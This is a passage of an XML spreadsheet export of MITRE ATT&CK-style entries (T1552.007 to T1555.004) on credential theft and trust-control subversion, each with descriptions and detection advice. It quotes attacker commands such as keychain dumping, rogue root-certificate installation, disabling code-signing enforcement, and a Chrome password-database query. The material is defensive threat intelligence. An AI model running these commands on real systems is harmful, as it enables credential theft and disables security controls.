* Metasploit’s post exploitation module: &lt;code&gt;post/windows/gather/credentials/gpp&lt;/code&gt;
* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)
* gpprefdecrypt.py
On the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: &lt;code&gt;dir /s * .xml&lt;/code&gt;
</t>
  </si>
  <si>
    <t>Monitor for attempts to access SYSVOL that involve searching for XML files. 
Deploy a new XML file with permissions set to Everyone:Deny and monitor for Access Denied errors.(Citation: ADSecurity Finding Passwords in SYSVOL)</t>
  </si>
  <si>
    <t>T1552.007</t>
  </si>
  <si>
    <t>Container API (T1552.007)</t>
  </si>
  <si>
    <t>Command: Command Execution, User Account: User Account Authentication</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.(Citation: Docker API)(Citation: Kubernetes API)
An adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment.(Citation: Unit 42 Unsecured Docker Daemons) An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components. </t>
  </si>
  <si>
    <t>Establish centralized logging for the activity of container and Kubernetes cluster components. Monitor logs for actions that could be taken to gather credentials to container and cloud infrastructure, including the use of discovery API calls by new or unexpected users and APIs that access Docker logs.
It may be possible to detect adversary use of credentials they have obtained such as in [Valid Accounts](https://attack.mitre.org/techniques/T1078).</t>
  </si>
  <si>
    <t>T1552.008</t>
  </si>
  <si>
    <t>Chat Messages (T1552.008)</t>
  </si>
  <si>
    <t>Adversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.
Rather than accessing the stored chat logs (i.e., [Credentials In Files](https://attack.mitre.org/techniques/T1552/001)), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation (Citation: Slack Security Risks).</t>
  </si>
  <si>
    <t>T1553</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Metadata, File: File Modification, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.
Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates) </t>
  </si>
  <si>
    <t xml:space="preserve">Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers. Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries. (Citation: SpectorOps Subverting Trust Sept 2017) A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity.(Citation: SpectorOps Code Signing Dec 2017)
Analyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure "Hide Microsoft Entries" and "Hide Windows Entries" are both deselected.(Citation: SpectorOps Subverting Trust Sept 2017) 
Monitor and investigate attempts to modify extended file attributes with utilities such as &lt;code&gt;xattr&lt;/code&gt;. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. </t>
  </si>
  <si>
    <t>T1553.001</t>
  </si>
  <si>
    <t>Gatekeeper Bypass (T1553.001)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Metadata, File: File Modification, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple’s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.(Citation: TheEclecticLightCompany Quarantine and the flag)(Citation: TheEclecticLightCompany apple notarization )
Based on an opt-in system, when files are downloaded an extended attribute (xattr) called `com.apple.quarantine` (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:
1. Checks extended attribute – Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.(Citation: OceanLotus for OS X)(Citation: 20 macOS Common Tools and Techniques)
2. Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.
3. Code Signing – Gatekeeper checks for a valid code signature from an Apple Developer ID.
4. Notarization - Using the `api.apple-cloudkit.com` API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an “unauthorized app” and the security policy will be modified.
Adversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211)), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.(Citation: theevilbit gatekeeper bypass 2021)(Citation: Application Bundle Manipulation Brandon Dalton)
Applications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).</t>
  </si>
  <si>
    <t>The removal of the &lt;code&gt;com.apple.quarantine&lt;/code&gt; flag by a user instead of the operating system is a suspicious action and should be examined further. Monitor and investigate attempts to modify extended file attributes with utilities such as &lt;code&gt;xattr&lt;/code&gt;. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. Monitor software update frameworks that strip the &lt;code&gt;com.apple.quarantine&lt;/code&gt; flag when performing updates. 
Review &lt;code&gt;false&lt;/code&gt; values under the &lt;code&gt;LSFileQuarantineEnabled&lt;/code&gt; entry in an application's &lt;code&gt;Info.plist&lt;/code&gt; file (required by every application). &lt;code&gt;false&lt;/code&gt; under &lt;code&gt;LSFileQuarantineEnabled&lt;/code&gt; indicates that an application does not use the quarantine flag. Unsandboxed applications with an unspecified &lt;code&gt;LSFileQuarantineEnabled&lt;/code&gt; entry will default to not setting the quarantine flag. 
QuarantineEvents is a SQLite database containing a list of all files assigned the &lt;code&gt;com.apple.quarantine&lt;/code&gt; attribute, located at &lt;code&gt;~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2&lt;/code&gt;. Each event contains the corresponding UUID, timestamp, application, Gatekeeper score, and decision if it was allowed.(Citation: TheEclecticLightCompany Quarantine and the flag)</t>
  </si>
  <si>
    <t>T1553.002</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature.
Code signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)(Citation: EclecticLightChecksonEXECodeSigning)
Code signing certificates may be used to bypass security policies that require signed code to execute on a system. </t>
  </si>
  <si>
    <t>Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.</t>
  </si>
  <si>
    <t>T1553.003</t>
  </si>
  <si>
    <t>SIP and Trust Provider Hijacking (T1553.003)</t>
  </si>
  <si>
    <t>File: File Modification, Module: Module Load, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)
Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)
Similar to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)
* Modifying the &lt;code&gt;Dll&lt;/code&gt; and &lt;code&gt;FuncName&lt;/code&gt; Registry values in &lt;code&gt;HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID}&lt;/code&gt; that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).
* Modifying the &lt;code&gt;Dll&lt;/code&gt; and &lt;code&gt;FuncName&lt;/code&gt; Registry values in &lt;code&gt;HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID}&lt;/code&gt; that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.
* Modifying the &lt;code&gt;DLL&lt;/code&gt; and &lt;code&gt;Function&lt;/code&gt; Registry values in &lt;code&gt;HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID}&lt;/code&gt; that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).
* **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).
Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)</t>
  </si>
  <si>
    <t>Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries. (Citation: SpectorOps Subverting Trust Sept 2017)
Enable CryptoAPI v2 (CAPI) event logging (Citation: Entrust Enable CAPI2 Aug 2017) to monitor and analyze error events related to failed trust validation (Event ID 81, though this event can be subverted by hijacked trust provider components) as well as any other provided information events (ex: successful validations). Code Integrity event logging may also provide valuable indicators of malicious SIP or trust provider loads, since protected processes that attempt to load a maliciously-crafted trust validation component will likely fail (Event ID 3033). (Citation: SpectorOps Subverting Trust Sept 2017)
Utilize Sysmon detection rules and/or enable the Registry (Global Object Access Auditing) (Citation: Microsoft Registry Auditing Aug 2016) setting in the Advanced Security Audit policy to apply a global system access control list (SACL) and event auditing on modifications to Registry values (sub)keys related to SIPs and trust providers: (Citation: Microsoft Audit Registry July 2012)
* HKLM\SOFTWARE\Microsoft\Cryptography\OID
* HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\OID
* HKLM\SOFTWARE\Microsoft\Cryptography\Providers\Trust
* HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\Providers\Trust
**Note:** As part of this technique, adversaries may attempt to manually edit these Registry keys (ex: Regedit) or utilize the legitimate registration process using [Regsvr32](https://attack.mitre.org/techniques/T1218/010). (Citation: SpectorOps Subverting Trust Sept 2017)
Analyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure “Hide Microsoft Entries” and “Hide Windows Entries” are both deselected. (Citation: SpectorOps Subverting Trust Sept 2017)</t>
  </si>
  <si>
    <t>T1553.004</t>
  </si>
  <si>
    <t>Install Root Certificate (T1553.004)</t>
  </si>
  <si>
    <t>Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate)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Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental)
Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish)
Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec 2017)
In macOS, the Ay MaMi malware uses &lt;code&gt;/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert&lt;/code&gt; to install a malicious certificate as a trusted root certificate into the system keychain.(Citation: objective-see ay mami 2018)</t>
  </si>
  <si>
    <t>A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity.(Citation: SpectorOps Code Signing Dec 2017) Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and through authroot.stl.(Citation: SpectorOps Code Signing Dec 2017) The Sysinternals Sigcheck utility can also be used (&lt;code&gt;sigcheck[64].exe -tuv&lt;/code&gt;) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List.(Citation: Microsoft Sigcheck May 2017)
Installed root certificates are located in the Registry under &lt;code&gt;HKLM\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates\&lt;/code&gt; and &lt;code&gt;[HKLM or HKCU]\Software[\Policies\]\Microsoft\SystemCertificates\Root\Certificates\&lt;/code&gt;. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison:(Citation: Tripwire AppUNBlocker)
* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25
* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85
* 3B1EFD3A66EA28B16697394703A72CA340A05BD5
* 7F88CD7223F3C813818C994614A89C99FA3B5247
* 8F43288AD272F3103B6FB1428485EA3014C0BCFE
* A43489159A520F0D93D032CCAF37E7FE20A8B419
* BE36A4562FB2EE05DBB3D32323ADF445084ED656
* CDD4EEAE6000AC7F40C3802C171E30148030C072</t>
  </si>
  <si>
    <t>T1553.005</t>
  </si>
  <si>
    <t>Mark-of-the-Web Bypass (T1553.005)</t>
  </si>
  <si>
    <t>Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named &lt;code&gt;Zone.Identifier&lt;/code&gt; with a specific value known as the MOTW.(Citation: Microsoft Zone.Identifier 2020) Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)(Citation: Intezer Russian APT Dec 2020)
Adversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)</t>
  </si>
  <si>
    <t>Monitor compressed/archive and image files downloaded from the Internet as the contents may not be tagged with the MOTW. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities.(Citation: Disable automount for ISO)</t>
  </si>
  <si>
    <t>T1553.006</t>
  </si>
  <si>
    <t>Code Signing Policy Modification (T1553.006)</t>
  </si>
  <si>
    <t>Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. 
Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.(Citation: Microsoft DSE June 2017)(Citation: Apple Disable SIP) Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.(Citation: Microsoft Unsigned Driver Apr 2017)(Citation: Apple Disable SIP)
Adversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, [Modify Registry](https://attack.mitre.org/techniques/T1112), rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP)(Citation: FireEye HIKIT Rootkit Part 2)(Citation: GitHub Turla Driver Loader) Examples of commands that can modify the code signing policy of a system include &lt;code&gt;bcdedit.exe -set TESTSIGNING ON&lt;/code&gt; on Windows and &lt;code&gt;csrutil disable&lt;/code&gt; on macOS.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP) Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.(Citation: F-Secure BlackEnergy 2014)
To gain access to kernel memory to modify variables related to signature checks, such as modifying &lt;code&gt;g_CiOptions&lt;/code&gt; to disable Driver Signature Enforcement, adversaries may conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) using a signed, but vulnerable driver.(Citation: Unit42 AcidBox June 2020)(Citation: GitHub Turla Driver Loader)</t>
  </si>
  <si>
    <t>Monitor processes and command-line arguments for actions that could be taken to modify the code signing policy of a system, such as &lt;code&gt;bcdedit.exe -set TESTSIGNING ON&lt;/code&gt;.(Citation: Microsoft TESTSIGNING Feb 2021) Consider monitoring for modifications made to Registry keys associated with code signing policies, such as &lt;code&gt;HKCU\Software\Policies\Microsoft\Windows NT\Driver Signing&lt;/code&gt;. Modifications to the code signing policy of a system are likely to be rare.</t>
  </si>
  <si>
    <t>T1554</t>
  </si>
  <si>
    <t>File: File Creation, File: File Deletion, File: File Metadata, File: File Modification</t>
  </si>
  <si>
    <t>Adversaries may modify host software binaries to establish persistent access to systems. Software binaries/executables provide a wide range of system commands or services, programs, and libraries. Common software binaries are SSH clients, FTP clients, email clients, web browsers, and many other user or server applications.
Adversaries may establish persistence though modifications to host software binaries. For example, an adversary may replace or otherwise infect a legitimate application binary (or support files) with a backdoor. Since these binaries may be routinely executed by applications or the user, the adversary can leverage this for persistent access to the host. An adversary may also modify a software binary such as an SSH client in order to persistently collect credentials during logins (i.e., [Modify Authentication Process](https://attack.mitre.org/techniques/T1556)).(Citation: Google Cloud Mandiant UNC3886 2024)
An adversary may also modify an existing binary by patching in malicious functionality (e.g., IAT Hooking/Entry point patching)(Citation: Unit42 Banking Trojans Hooking 2022) prior to the binary’s legitimate execution. For example, an adversary may modify the entry point of a binary to point to malicious code patched in by the adversary before resuming normal execution flow.(Citation: ESET FontOnLake Analysis 2021)
After modifying a binary, an adversary may attempt to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by preventing it from updating (e.g., via the `yum-versionlock` command or `versionlock.list` file in Linux systems that use the yum package manager).(Citation: Google Cloud Mandiant UNC3886 2024)</t>
  </si>
  <si>
    <t>Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment. Look for changes to client software that do not correlate with known software or patch cycles. 
Consider monitoring for anomalous behavior from client applications, such as atypical module loads, file reads/writes, or network connections.</t>
  </si>
  <si>
    <t>T1555</t>
  </si>
  <si>
    <t>Cloud Service: Cloud Service Enumeration, Command: Command Execution, File: File Access, Process: OS API Execution, Process: Process Access, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may search for common password storage locations to obtain user credentials.(Citation: F-Secure The Dukes) Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.</t>
  </si>
  <si>
    <t>Monitor system calls, file read events, and processes for suspicious activity that could indicate searching for a password  or other activity related to performing keyword searches (e.g. password, pwd, login, store, secure, credentials, etc.) in process memory for credentials. File read events should be monitored surrounding known password storage applications.</t>
  </si>
  <si>
    <t>T1555.001</t>
  </si>
  <si>
    <t>Keychain (T1555.001)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Access, Process: OS API Execution, Process: Process Creation</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple’s iCloud service. 
Keychains can be viewed and edited through the Keychain Access application or using the command-line utility &lt;code&gt;security&lt;/code&gt;. Keychain files are located in &lt;code&gt;~/Library/Keychains/&lt;/code&gt;, &lt;code&gt;/Library/Keychains/&lt;/code&gt;, and &lt;code&gt;/Network/Library/Keychains/&lt;/code&gt;.(Citation: Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation: OSX Keychain Schaumann)
Adversaries may gather user credentials from Keychain storage/memory. For example, the command &lt;code&gt;security dump-keychain –d&lt;/code&gt; will dump all Login Keychain credentials from &lt;code&gt;~/Library/Keychains/login.keychain-db&lt;/code&gt;. Adversaries may also directly read Login Keychain credentials from the &lt;code&gt;~/Library/Keychains/login.keychain&lt;/code&gt; file. Both methods require a password, where the default password for the Login Keychain is the current user’s password to login to the macOS host.(Citation: External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)  </t>
  </si>
  <si>
    <t>Unlocking the keychain and using passwords from it is a very common process, so there is likely to be a lot of noise in any detection technique. Monitoring of system calls to the keychain can help determine if there is a suspicious process trying to access it.</t>
  </si>
  <si>
    <t>T1555.002</t>
  </si>
  <si>
    <t>Securityd Memory (T1555.002)</t>
  </si>
  <si>
    <t>Command: Command Execution, Process: Process Access</t>
  </si>
  <si>
    <t>An adversary with root access may gather credentials by reading `securityd`’s memory. `securityd` is a service/daemon responsible for implementing security protocols such as encryption and authorization.(Citation: Apple Dev SecurityD) A privileged adversary may be able to scan through `securityd`'s memory to find the correct sequence of keys to decrypt the user’s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain)(Citation: OSX Keydnap malware)
In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.(Citation: OS X Keychain)(Citation: External to DA, the OS X Way) Apple’s `securityd` utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.(Citation: OS X Keychain)</t>
  </si>
  <si>
    <t>Monitor processes and command-line arguments for activity surrounded users searching for credentials or using automated tools to scan memory for passwords.</t>
  </si>
  <si>
    <t>T1555.003</t>
  </si>
  <si>
    <t>Credentials from Web Browsers (T1555.003)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Access, Process: OS API Execution, Process: Process Access</t>
  </si>
  <si>
    <t>Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.
For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, &lt;code&gt;AppData\Local\Google\Chrome\User Data\Default\Login Data&lt;/code&gt; and executing a SQL query: &lt;code&gt;SELECT action_url, username_value, password_value FROM logins;&lt;/code&gt;. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function &lt;code&gt;CryptUnprotectData&lt;/code&gt;, which uses the victim’s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData April 2018)
Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).
Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)
After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).</t>
  </si>
  <si>
    <t>Identify web browser files that contain credentials such as Google Chrome’s Login Data database file: &lt;code&gt;AppData\Local\Google\Chrome\User Data\Default\Login Data&lt;/code&gt;. Monitor file read events of web browser files that contain credentials, especially when the reading process is unrelated to the subject web browser. Monitor process execution logs to include PowerShell Transcription focusing on those that perform a combination of behaviors including reading web browser process memory, utilizing regular expressions, and those that contain numerous keywords for common web applications (Gmail, Twitter, Office365, etc.).</t>
  </si>
  <si>
    <t>T1555.004</t>
  </si>
  <si>
    <t>Windows Credential Manager (T1555.004)</t>
  </si>
  <si>
    <t>Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft Credential Manager store)(Citation: Microsoft Credential Locker)
The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.
Credential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\`. The encryption key can be found in a file named &lt;code&gt;Policy.vpol&lt;/code&gt;, typically located in the same folder as the credentials.(Citation: passcape Windows Vault)(Citation: Malwarebytes The Windows Vault)
Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms. &lt;code&gt;vaultcmd.exe&lt;/code&gt; is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as &lt;code&gt;CredEnumerateA&lt;/code&gt;, may also be absued to list credentials managed by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)
Adversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running &lt;code&gt;rundll32.exe keymgr.dll KRShowKeyMgr&lt;/code&gt; then selecting the “Back up...” button on the “Stored User Names and Passwords” GUI.
Password recovery tools may also obtain plain text passwords from the Credential Manager.(Citation: Malwarebytes The Windows Vault)</t>
  </si>
  <si>
